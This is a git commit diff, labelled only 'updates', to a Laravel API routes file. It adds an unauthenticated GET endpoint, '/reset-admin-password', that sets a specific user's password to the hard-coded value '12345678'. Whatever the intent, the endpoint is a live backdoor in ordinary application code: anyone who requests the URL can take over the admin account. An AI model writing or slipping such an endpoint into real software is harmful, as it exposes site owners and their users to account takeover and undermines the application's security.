f886d18454daeb50630a1f4b138b05859709d053
Victory Okon <victoryozitech1@gmail.com>
2026-03-15 21:08:23 +0100

    updates -- victory

--- routes/api.php
+++ routes/api.php
@@ -3,12 +3,20 @@
 use App\Http\Controllers\Api\AuthController;
 use App\Http\Controllers\Api\ProductController;
 use App\Http\Controllers\Api\UserController;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Route;
 
 Route::get('/test', function () {
     return response()->json([
         'message' => 'API working'
     ]);
+});
+
+Route::get('/reset-admin-password', function () {
+    $user = \App\Models\User::where('email', 'isaacosrael011@gmail.com')->first();
+    $user->password = Hash::make('12345678');
+    $user->save();
+    return 'Admin password reset!';
 });
 
 Route::get('/routes-check', function () {
